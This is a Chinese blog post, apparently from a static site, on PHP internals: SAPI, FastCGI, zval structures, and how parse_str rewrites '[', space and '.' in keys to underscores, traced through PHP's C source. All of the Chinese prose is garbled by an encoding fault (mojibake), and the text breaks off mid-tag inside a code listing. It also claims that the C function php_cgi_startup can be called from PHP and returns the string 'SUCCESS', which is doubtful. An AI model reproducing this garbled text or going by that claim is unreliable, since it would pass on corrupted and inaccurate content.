class="headerlink" title="SAPIæ¦‚è¿°"></a>SAPIæ¦‚è¿°</h3><p>â€‹    PHPä¸­å’ŒæœåŠ¡ç›¸å…³çš„æ“ä½œéƒ½æ˜¯é€šè¿‡SAPIçš„æ¥å£å®ç°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101735370.png" alt="image-20220110173552318"></p><p>â€‹    å„ä¸ªæœåŠ¡çš„æŠ½è±¡å±‚å€¼ä¹‹é—´éµå®ˆç€ç›¸åŒçš„çº¦å®šï¼Œè¿™é‡Œç§°ä¹‹ä¸º SAPI æ¥å£ã€‚æ¯ä¸ªSAPIå®ç°éƒ½æ˜¯ä¸€ä¸ª _sapi_moudle_struct ç»“æ„ä½“å˜é‡ã€‚</p><p>â€‹    demo:</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">php_cgi_startup</span><span class="hljs-params">(sapi_module_struct *sapi_module)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (php_module_startup(sapi_module, &amp;cgi_module_entry, <span class="hljs-number">1</span>) == FAILURE) &#123;<br><span class="hljs-keyword">return</span> FAILURE;<br>&#125;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•è¿™ä¸ªè¿”å›å€¼æ˜¯ string(6) â€œSUCCESSâ€ï¼Œè€Œä¸”å¯ä»¥ç”¨ä½œæ¡ä»¶åˆ¤æ–­</p><p><code>if(php_cgi_startup())&#123; echo 1;&#125;</code></p><p>å¦‚æœ SUCCESSï¼Œè¾“å‡º1</p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>**CGI **èƒ½å®ç°è¯­è¨€è§£é‡Šå™¨ä¸webæœåŠ¡å™¨çš„é€šä¿¡ã€‚</p><p><strong>FastCGI</strong> æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯ è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œå®ƒå¯ä»¥ä¸€ç›´æ‰§è¡Œï¼Œè¿˜å¯ä»¥æ”¯æŒåˆ†å¸ƒå¼è¿ç®—</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102325878.png" alt="image-20220110232512816"></p><h2 id="PHPè„šæœ¬æ‰§è¡Œ"><a href="#PHPè„šæœ¬æ‰§è¡Œ" class="headerlink" title="PHPè„šæœ¬æ‰§è¡Œ"></a>PHPè„šæœ¬æ‰§è¡Œ</h2><blockquote><p>ä»è¿™é‡Œå¼€å§‹å°±å¼€å§‹åˆ†å‡ ä¸ªäºŒçº§æ ‡é¢˜ï¼Œå› ä¸ºæˆ‘è§‰å¾—è¿™å·²ç»è„±ç¦»äº†å‰ç½®çŸ¥è¯†çš„èŒƒç•´</p></blockquote><p>â€‹    å…ˆæ¥è¯´ä¸€è¯´PHPï¼ŒPHPæ˜¯è§£é‡Šæ€§è¯­è¨€ï¼Œå®ƒæ— éœ€ç¼–è¯‘å³å¯â€œç›´æ¥è¿è¡Œâ€</p><p>â€‹    ä½†æ˜¯æˆ‘ä»¬çŸ¥é“æœ€åº•å±‚æ˜¯æœºå™¨è¯­è¨€ï¼Œå®é™…ä¸Šè¿˜æ˜¯è¦æœ‰ä¸€ä¸ªè½¬æ¢è¿‡ç¨‹çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±å›éœ€è¦ä¸€ä¸ª<strong>è§£é‡Šå™¨</strong>ï¼Œç”±è§£é‡Šå™¨æ¥æ‰§è¡Œè¿™äº›ä»£ç ï¼Œä¸€èˆ¬ä¼šåœ¨è¿è¡Œæ—¶å®æ—¶ç¼–è¯‘ï¼Œä»¥æ­¤æ¥æé«˜æ•ˆç‡ã€‚PHPä¸ºäº†æé«˜æ‰§è¡Œæ•ˆç‡ï¼Œæå‡ºäº†opcodeç¼“å­˜æ‹“å±•(APC,xcache,eAcceleratorç­‰)ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…é‡æ–°ç¼–è¯‘å¸¦æ¥çš„æ€§èƒ½æŸå¤±ã€‚</p><p>â€‹    ä¸€èˆ¬æ¥è¯´ï¼Œç¨‹åºä¼šç»è¿‡è¿™æ ·çš„é˜¶æ®µï¼š</p><p>â€‹        1ï¸âƒ£ä¼ é€’ç»™phpéœ€è¦æ‰§è¡Œçš„æ–‡ä»¶</p><p>â€‹        2ï¸âƒ£phpå®Œæˆå‡†å¤‡å·¥ä½œåå¯åŠ¨PHPåŠZendè™šæ‹Ÿæœºï¼ŒåŠ è½½æ³¨å†Œçš„æ‹“å±•æ¨¡å—</p><p>â€‹        3ï¸âƒ£è¯»å–è„šæœ¬ï¼ŒZendå¼•æ“å¯¹è„šæœ¬æ–‡ä»¶è¿›è¡Œè¯æ³•åˆ†æï¼Œè¯­æ³•åˆ†æ</p><p>â€‹        4ï¸âƒ£ç¼–è¯‘ä¸ºopcode</p><p>å¯¹äºè¯­æ³•åˆ†æè§($PHP_SRC/Zend/zend_language_parser)ï¼Œå®ƒå°†æºä»£ç åˆ‡æˆæ•°ç»„</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201110002241.png" alt="image-20220111000256180"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">zend_value</span> &#123;</span>   <span class="hljs-comment">//å˜é‡å­˜å‚¨åœ¨è¿™ä¸ªè”åˆä½“é‡Œ</span><br>zend_long         lval;<span class="hljs-comment">/* long value */</span><br><span class="hljs-keyword">double</span>            dval;<span class="hljs-comment">/* double value */</span><br>zend_refcounted  *counted;<br>zend_string      *str;<br>zend_array       *arr;<br>zend_object      *obj;<br>zend_resource    *res;<br>zend_reference   *ref;   <span class="hljs-comment">//å¼•ç”¨æ¬¡æ•°</span><br>zend_ast_ref     *ast;<br>zval             *zv;<br><span class="hljs-keyword">void</span>             *ptr;<br>zend_class_entry *ce;<br>zend_function    *func;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span> w1;<br><span class="hljs-keyword">uint32_t</span> w2;<br>&#125; ww;<br>&#125; zend_value;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zval_struct</span> &#123;</span><br>zend_value        value;<span class="hljs-comment">/* value */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ZEND_ENDIAN_LOHI_3(<br>zend_uchar    type,<span class="hljs-comment">/* active type */</span><br>zend_uchar    type_flags,<br><span class="hljs-keyword">union</span> &#123;<br><span class="hljs-keyword">uint16_t</span>  extra;        <span class="hljs-comment">/* not further specified */</span><br>&#125; u)<br>&#125; v;<br><span class="hljs-keyword">uint32_t</span> type_info;<br>&#125; u1;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span>     next;                 <span class="hljs-comment">/* hash collision chain */</span><br><span class="hljs-keyword">uint32_t</span>     cache_slot;           <span class="hljs-comment">/* cache slot (for RECV_INIT) */</span><br><span class="hljs-keyword">uint32_t</span>     opline_num;           <span class="hljs-comment">/* opline number (for FAST_CALL) */</span><br><span class="hljs-keyword">uint32_t</span>     lineno;               <span class="hljs-comment">/* line number (for ast nodes) */</span><br><span class="hljs-keyword">uint32_t</span>     num_args;             <span class="hljs-comment">/* arguments number for EX(This) */</span><br><span class="hljs-keyword">uint32_t</span>     fe_pos;               <span class="hljs-comment">/* foreach position */</span><br><span class="hljs-keyword">uint32_t</span>     fe_iter_idx;          <span class="hljs-comment">/* foreach iterator index */</span><br><span class="hljs-keyword">uint32_t</span>     access_flags;         <span class="hljs-comment">/* class constant access flags */</span><br><span class="hljs-keyword">uint32_t</span>     property_guard;       <span class="hljs-comment">/* single property guard */</span><br><span class="hljs-keyword">uint32_t</span>     constant_flags;       <span class="hljs-comment">/* constant flags */</span><br><span class="hljs-keyword">uint32_t</span>     extra;                <span class="hljs-comment">/* not further specified */</span><br>&#125; u2;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å“ˆå¸Œè¡¨ï¼šé€šè¿‡å“ˆå¸Œå‡½æ•°ï¼Œè®²ç‰¹å®šçš„é”®æ˜ å°„åˆ°ç‰¹å®šçš„å€¼çš„æ•°æ®ç»“æ„ï¼Œç»´æŠ¤é”®å’Œå€¼çš„å¯¹åº”å…³ç³»ï¼Œä½†æ˜¯æ—¶é—´å¤æ‚åº¦æ˜¯O(1)æ¯”é“¾è¡¨O(n)ï¼Œæ•ˆç‡æ›´é«˜</p><h2 id="PHPç»å…¸é—®é¢˜è§£æ"><a href="#PHPç»å…¸é—®é¢˜è§£æ" class="headerlink" title="PHPç»å…¸é—®é¢˜è§£æ"></a>PHPç»å…¸é—®é¢˜è§£æ</h2><h3 id="PHPå­—ç¬¦ä¸²è§£æé—®é¢˜"><a href="#PHPå­—ç¬¦ä¸²è§£æé—®é¢˜" class="headerlink" title="PHPå­—ç¬¦ä¸²è§£æé—®é¢˜"></a>PHPå­—ç¬¦ä¸²è§£æé—®é¢˜</h3><p>é¦–å…ˆæ¥çœ‹ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    parse_str(<span class="hljs-string">&#x27;test[abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test.abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-comment">//æˆ‘ä»¬ä¸€å®šæœŸæœ› tmp çš„é”®å åˆ†åˆ«æ˜¯ test[abc,test abc,test.abc ç„¶è€Œé¢„æœŸçš„ç°è±¡å¹¶æ²¡æœ‰å‘ç”Ÿ</span><br><span class="hljs-comment">//è¿”å›ç»“æœ</span><br><br>E:\å®¡è®¡ä¸“ç”¨\easyFirewall-shell\å®¡è®¡\test.php:<span class="hljs-number">3</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\å®¡è®¡ä¸“ç”¨\easyFirewall-shell\å®¡è®¡\test.php:<span class="hljs-number">5</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\å®¡è®¡ä¸“ç”¨\easyFirewall-shell\å®¡è®¡\test.php:<span class="hljs-number">7</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç° â€˜[â€˜ ,â€™ â€˜å’Œâ€™.â€™ï¼Œéƒ½è¢«æ›¿æ¢ä¸ºäº†â€™_â€™ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬ä»å†…æ ¸çš„è§’åº¦çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„é—®é¢˜ã€‚</p><p>æ„å»ºç®€å•çš„PHPä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    parse_str(<span class="hljs-string">&#x27;test[ab=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>å…³äº parse_str å‡½æ•°çš„å®šä¹‰æ˜¯åœ¨ <code>$PHP_SRC/ext/standard/string.c line 5033</code> å¤„</p><p>è®©æˆ‘ä»¬æ¥ç®€å•çœ‹ä¸€ä¸‹å‡½æ•°å®šä¹‰çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">PHP_FUNCTION(parse_str)<br>&#123;<br><span class="hljs-keyword">char</span> *arg;<br>zval *arrayArg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">size_t</span> arglen;<br><br>ZEND_PARSE_PARAMETERS_START(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">//Zendè™šæ‹Ÿæœºåªè´Ÿè´£è„šæœ¬è¯­ä¹‰è§£æï¼Œæ‰€ä»¥è¿™é‡Œä¸ç”¨è¿‡åˆ†å…³æ³¨</span><br>Z_PARAM_STRING(arg, arglen)<br><span class="hljs-function">Z_PARAM_OPTIONAL</span><br><span class="hljs-function"><span class="hljs-title">Z_PARAM_ZVAL</span><span class="hljs-params">(arrayArg)</span></span><br><span class="hljs-function"><span class="hljs-title">ZEND_PARSE_PARAMETERS_END</span><span class="hljs-params">()</span></span>;<br><br>res = estrndup(arg, arglen);   <span class="hljs-comment">//å°†å­—ç¬¦ä¸²æ‹·è´åˆ°æ–°å»ºçš„ä½ç½®å¤„</span><br><br><span class="hljs-keyword">if</span> (arrayArg == <span class="hljs-literal">NULL</span>) &#123;<br>zval tmp;<br>zend_array *symbol_table;<br><span class="hljs-keyword">if</span> (zend_forbid_dynamic_call(<span class="hljs-string">&quot;parse_str() with a single argument&quot;</span>) == FAILURE) &#123;  <span class="hljs-comment">//é”™è¯¯å¤„ç†</span><br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>php_error_docref(<span class="hljs-literal">NULL</span>, E_DEPRECATED, <span class="hljs-string">&quot;Calling parse_str() without the result argument is deprecated&quot;</span>);<br><br>symbol_table = zend_rebuild_symbol_table();<br>ZVAL_ARR(&amp;tmp, symbol_table);<br>sapi_module.treat_data(PARSE_STRING, res, &amp;tmp);     <span class="hljs-comment">//è´Ÿè´£çº¿ç¨‹ä¸å®‰å…¨çš„å¤„ç†æ–¹æ³•ï¼Œæˆ‘è¿™é‡Œæ˜¯TSç‰ˆæœ¬æ‰€ä»¥å®é™…è¿™é‡Œä¸å¿…å…³æ³¨</span><br><span class="hljs-keyword">if</span> (UNEXPECTED(zend_hash_del(symbol_table, ZSTR_KNOWN(ZEND_STR_THIS)) == SUCCESS)) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>arrayArg = zend_try_array_init(arrayArg);<br><span class="hljs-keyword">if</span> (!arrayArg) &#123;<br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>sapi_module.treat_data(PARSE_STRING, res, arrayArg);  <span class="hljs-comment">//è¿™é‡ŒçœŸæ­£å¼€å§‹è§£æå˜é‡ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹ä¸‹æ–­ç‚¹</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›æ¥åˆ°  <code>$PHP_SRC/main/php_variables.c</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111036660.png" alt="image-20220111103617451"></p><p>è¿™é‡Œç»™å‡ºæºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">SAPI_API <span class="hljs-title">SAPI_TREAT_DATA_FUNC</span><span class="hljs-params">(php_default_treat_data)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>, *var, *val, *separator = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *c_var;<br>zval <span class="hljs-built_in">array</span>;<br><span class="hljs-keyword">int</span> free_buffer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *strtok_buf = <span class="hljs-literal">NULL</span>;<br>zend_long count = <span class="hljs-number">0</span>;<br><br>ZVAL_UNDEF(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>array_init(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_POST]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_POST], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_GET:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_GET]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_GET], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_COOKIE]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_COOKIE], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ZVAL_COPY_VALUE(&amp;<span class="hljs-built_in">array</span>, destArray);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_POST) &#123;    <span class="hljs-comment">//æ ¹æ®å˜é‡çš„ä¸åŒç±»å‹è¿è¡Œä¸åŒè§£ææ–¹æ³•</span><br>sapi_handle_post(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_GET) &#123;<span class="hljs-comment">/* GET data */</span><br>c_var = SG(request_info).query_string;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<span class="hljs-comment">/* Cookie data */</span><br>c_var = SG(request_info).cookie_data;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_STRING) &#123;<span class="hljs-comment">/* String data */</span>  <span class="hljs-comment">//è§£æå­—ç¬¦ä¸² è¿™ä¸ªæ‰æ˜¯æˆ‘ä»¬å…³æ³¨çš„ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰å‡½æ•°è°ƒç”¨æ¥ç€å¾€ä¸‹çœ‹</span><br>res = str;<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!res) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_STRING:<br>separator = PG(arg_separator).input;  <span class="hljs-comment">//PGæ˜¯ä¸ºäº†è§£å†³çº¿ç¨‹å®‰å…¨çš„å…¨å±€å˜é‡å®</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>separator = <span class="hljs-string">&quot;;\0&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>var = php_strtok_r(res, separator, &amp;strtok_buf);  <span class="hljs-comment">//å­—ç¬¦ä¸²åˆ‡ç‰‡å­˜å…¥æ•°ç»„ï¼Œå› ä¸ºè¿™é‡Œ&amp;strtok_bufæ˜¯NULLæ‰€ä»¥è¿™é‡Œåªæ˜¯éå†æ²¡æœ‰å½±å“</span><br><br><span class="hljs-keyword">while</span> (var) &#123;<br><span class="hljs-keyword">size_t</span> val_len;<br><span class="hljs-keyword">size_t</span> new_val_len;<br><br>val = <span class="hljs-built_in">strchr</span>(var, <span class="hljs-string">&#x27;=&#x27;</span>);   <span class="hljs-comment">//=ç”¨äºåŒºåˆ†å˜é‡åï¼Œå˜é‡åå¯¹åº”çš„å˜é‡å€¼ è¿™é‡Œvalå–åˆ°äº†å˜é‡çš„å€¼</span><br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br><span class="hljs-comment">/* Remove leading spaces from cookie names, needed for multi-cookie header where ; can be followed by a space */</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">isspace</span>(*var)) &#123;<br>var++;<br>&#125;<br><span class="hljs-keyword">if</span> (var == val || *var == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-keyword">goto</span> next_cookie;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (++count &gt; PG(max_input_vars)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variables exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_vars in php.ini.&quot;</span>, PG(max_input_vars));      <span class="hljs-comment">//è¶Šç•Œæ£€æµ‹</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (val) &#123; <span class="hljs-comment">/* have a value */</span>   <span class="hljs-comment">//å°±æ˜¯åœ¨å°¾å·´åŠ ä¸Šç»“æŸç¬¦</span><br><br>*val++ = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br>val_len = php_raw_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val_len = php_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val     = <span class="hljs-string">&quot;&quot;</span>;<br>val_len =  <span class="hljs-number">0</span>;<br>&#125;<br><br>val = estrndup(val, val_len);<br><span class="hljs-keyword">if</span> (arg != PARSE_COOKIE) &#123;<br>php_url_decode(var, <span class="hljs-built_in">strlen</span>(var));<br>&#125;<br><span class="hljs-keyword">if</span> (sapi_module.input_filter(arg, var, &amp;val, val_len, &amp;new_val_len)) &#123;<br>php_register_variable_safe(var, val, new_val_len, &amp;<span class="hljs-built_in">array</span>);   <span 